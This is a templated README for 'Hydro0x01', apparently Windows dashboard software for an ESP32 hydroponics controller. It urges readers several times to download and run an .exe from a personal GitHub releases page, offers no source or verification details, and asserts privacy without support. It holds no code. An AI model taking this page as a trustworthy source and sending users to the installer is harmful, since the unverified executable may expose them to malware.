# 🌿 Hydro0x01 - Manage your hydroponic garden with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/suvitha1962-del/Hydro0x01/releases)

Hydro0x01 provides a reliable method to monitor and control your hydroponic system. This software connects your ESP32 hardware to a central dashboard. You track water levels, pH balance, and nutrient density from your computer. The system records all data and helps you maintain healthy plants.

## 🛠 Features

*   **Real-time monitoring:** View current sensor data on a simple screen.
*   **Automated scheduling:** Set timers for pumps and lights.
*   **Data logging:** Save historical information to track long-term plant growth.
*   **Alert system:** Receive notifications when parameters move outside your set limits.
*   **Offline storage:** Keep your data safe even if the internet connection drops.
*   **Custom thresholds:** Define the ideal environment for specific plant types.

## 📦 System Requirements

Ensure your computer meets these requirements before you start:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 200 megabytes of free space.
*   **Network:** An active Wi-Fi or Ethernet connection to communicate with your ESP32 device.
*   **Hardware:** A functional Hydro0x01 ESP32 controller mounted to your hydroponic setup.

## 🚀 Getting Started

Follow these steps to set up the software on your Windows computer.

1. **Visit the download page:** Go to the [official release page](https://github.com/suvitha1962-del/Hydro0x01/releases) to access the software.
2. **Select the installer:** Look for the file ending in `.exe` under the latest release section. Click the filename to start the download.
3. **Run the file:** Open the downloaded file from your browser or your Downloads folder.
4. **Follow instructions:** A window appears to guide you through the installation process. Click Next until the software installs.
5. **Launch the app:** Locate the Hydro0x01 icon on your desktop or in your start menu to begin.

## ⚙️ Connecting Your Device

Once you open the software, you must link your hardware.

1. Connect your ESP32 device to your computer using a USB cable.
2. Open the application settings menu.
3. Select the COM port that matches your device. If you see multiple options, try each one until the system recognizes the connection.
4. Enter your local network credentials if the device requires a Wi-Fi connection.
5. Press the Save button to apply your settings.

The dashboard displays live data once the connection finishes. If the sensor values remain at zero, verify your physical sensor wiring and restart the application.

## 📉 Using the Dashboard

The main screen shows your sensors. You see circles or graphs representing your current setup. 

*   **pH Levels:** Adjust the acidity of your water to keep it in the ideal range.
*   **Temperature:** Monitor the water temperature to prevent root stress.
*   **Nutrient Levels:** Track electrical conductivity to ensure plants receive proper food.

You click the settings gear icon to change your goals. Enter new numbers for your maximum and minimum thresholds. The software changes color to indicate when a value exceeds your target range.

## 🧪 Data Analysis

The software stores all readings in a background database. You access this information by clicking the History tab. Use the date selector to view performance over weeks or months. This helps you identify trends in plant growth and water quality. You export this data to a text file for further review if needed.

## 🔧 Maintenance and Troubleshooting

If the software stops responding, check these points:

*   **Connection issues:** Unplug the USB cable, wait five seconds, and plug it back in.
*   **Update checks:** Periodically visit the download page to see if a newer version exists. Updates improve stability and add features.
*   **Driver support:** Modern Windows versions install drivers automatically. If your computer does not see the device, search for ESP32 USB drivers online.
*   **Internet access:** The dashboard relies on a local network connection to process data from the sensor. Ensure the device stays connected to the same network as your computer.

## 📋 Frequently Asked Questions

**Does the software work without a constant connection?**
Yes, the ESP32 captures data locally. You view the information once the computer connects to the same network.

**Can I manage multiple hydroponic units?**
You install the application once, but you may need to run separate instances to manage different hardware units. 

**Is my data private?**
All information stays on your local machine. No data leaves your home network unless you choose to share your files.

**How do I calibrate my sensors?**
Follow the calibration menu inside the application. You perform this process every few months to ensure accuracy.

**What happens if the power goes out?**
The ESP32 resumes operation automatically once it receives power. The software reconnects to the device as soon as your computer and the network are back online.